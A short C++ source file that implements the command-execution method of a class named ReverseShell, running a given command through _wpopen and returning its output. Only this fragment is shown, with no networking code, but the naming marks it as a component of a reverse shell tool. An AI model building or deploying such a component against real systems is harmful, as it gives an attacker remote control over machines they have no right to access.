#include <array>
#include <memory>
#include <iostream>
#include <cstring>
#include "ReverseShell.h"


std::string ReverseShell::executeCommand(const std::wstring & command) {

    std::array<char, 128> buffer{};
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(_wpopen(command.c_str(), L"r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    std::cout << static_cast<int>(strlen(result.c_str())) << std::endl;
    return result;
}
